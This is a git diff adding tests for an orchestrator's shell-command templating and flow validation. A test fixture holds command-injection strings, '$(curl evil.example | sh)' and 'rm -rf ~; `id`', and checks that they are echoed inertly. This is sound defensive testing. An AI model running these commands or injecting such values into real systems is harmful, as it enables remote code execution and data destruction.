@@ -3,6 +3,7 @@ import {
   type FlowDefinition,
   isActionStep,
   isAgentStep,
+  renderShellCommand,
   renderTemplate,
   TemplateError,
   templateRefs,
@@ -33,6 +34,34 @@ describe("renderTemplate", () => {
 
   test("templateRefs lists every reference", () => {
     expect(templateRefs("a {{x.y}} b {{ z }}")).toEqual(["x.y", "z"]);
+  });
+});
+
+describe("renderShellCommand", () => {
+  const ctx = {
+    inputs: { issue: { title: "$(curl evil.example | sh)", number: 7, note: "it's a 'test'" }, safe: "plain" },
+    steps: { impl: { output: "rm -rf ~; `id`" } },
+  };
+
+  test("renders values as quoted env exports referenced by the script", () => {
+    const script = renderShellCommand("make test N={{inputs.issue.number}} T={{inputs.safe}}", ctx);
+    expect(script).toContain("export ORCH_REF_0='7'");
+    expect(script).toContain("export ORCH_REF_1='plain'");
+    expect(script.endsWith("\nmake test N=${ORCH_REF_0} T=${ORCH_REF_1}")).toBe(true);
+  });
+
+  test("keeps shell metacharacters in values inert, including quotes and newlines", () => {
+    const script = renderShellCommand("echo {{inputs.issue.title}} {{steps.impl.output}} {{inputs.issue.note}}", ctx);
+    const proc = Bun.spawnSync(["bash", "-c", script], { stdout: "pipe", stderr: "pipe" });
+    expect(proc.exitCode).toBe(0);
+    expect(proc.stdout.toString()).toBe("$(curl evil.example | sh) rm -rf ~; `id` it's a 'test'\n");
+  });
+
+  test("reuses one export for repeated references and errors on unknown paths", () => {
+    const script = renderShellCommand("echo {{inputs.safe}} {{inputs.safe}}", ctx);
+    expect(script.match(/export /g)).toHaveLength(1);
+    expect(script).toBe("export ORCH_REF_0='plain'\necho ${ORCH_REF_0} ${ORCH_REF_0}");
+    expect(() => renderShellCommand("echo {{inputs.missing}}", ctx)).toThrow(TemplateError);
   });
 });
 
@@ -150,6 +179,39 @@ describe("validateFlow", () => {
     expect(bad.ok).toBe(false);
     if (bad.ok) return;
     expect(bad.errors.filter((e) => e.includes("command")).length).toBe(3);
+  });
+
+  test("accepts a shell step whose command templates earlier steps and inputs", () => {
+    const res = validateFlow({
+      ...baseFlow,
+      steps: [
+        { id: "impl", name: "Implement", kind: "prompt", prompt: "Implement {{inputs.issue.title}}" },
+        { id: "run", name: "Run", kind: "shell", command: "make test ARGS={{inputs.issue.number}} OUT={{steps.impl.output}}" },
+      ],
+    });
+    if (!res.ok) throw new Error(res.errors.join("\n"));
+    expect(res.flow.steps[1]).toMatchObject({ kind: "shell", timeoutSec: 1800 });
+  });
+
+  test("rejects shell steps with empty commands and forward step references", () => {
+    const empty = validateFlow({
+      ...baseFlow,
+      steps: [{ id: "run", name: "Run", kind: "shell", command: "" }],
+    });
+    expect(empty.ok).toBe(false);
+    if (!empty.ok) expect(empty.errors.join()).toContain("steps.0.command");
+
+    const forward = validateFlow({
+      ...baseFlow,
+      steps: [
+        { id: "use", name: "Use", kind: "shell", command: "echo {{steps.later.output}}" },
+        { id: "later", name: "Later", kind: "prompt", prompt: "x" },
+      ],
+    });
+    expect(forward.ok).toBe(false);
+    if (!forward.ok) {
+      expect(forward.errors.some((e) => e.includes('steps.0 (use).command: {{steps.later.output}} references step "later" which is not an earlier step'))).toBe(true);
+    }
   });
 
   test("accepts extra harness model roles and rejects default/smol and malformed role keys", () => {
@@ -287,6 +349,16 @@ describe("validateFlow for flows with a pull request input", () => {
     }
   });
 
+  test("rejects shell steps in flows with a pull request input", () => {
+    const res = validateFlow({
+      ...prFlow,
+      steps: [...prFlow.steps, { id: "run", name: "Run", kind: "shell", command: "cat {{inputs.pr.diffPath}}" }],
+    });
+    expect(res.ok).toBe(false);
+    if (res.ok) return;
+    expect(res.errors.join()).toContain("flows with a pull request input cannot contain shell steps");
+  });
+
   test("github_checkout and the PR trigger need the PR input", () => {
     const res = validateFlow({
       ...prFlow,
@@ -348,6 +420,18 @@ describe("github_comment steps", () => {
     });
     expect(chained.ok).toBe(false);
     if (!chained.ok) expect(chained.errors.join()).toContain('bodyFrom: "post" must be an earlier');
+  });
+
+  test("bodyFrom accepts a shell step", () => {
+    const res = validateFlow({
+      ...baseFlow,
+      steps: [
+        { id: "probe", name: "Probe", kind: "shell", command: "make test" },
+        { id: "post", name: "Post", kind: "github_comment", target: "issue", bodyFrom: "probe" },
+      ],
+    });
+    if (!res.ok) throw new Error(res.errors.join("\n"));
+    expect(res.flow.steps[1]).toMatchObject({ kind: "github_comment", bodyFrom: "probe" });
   });
 });
 
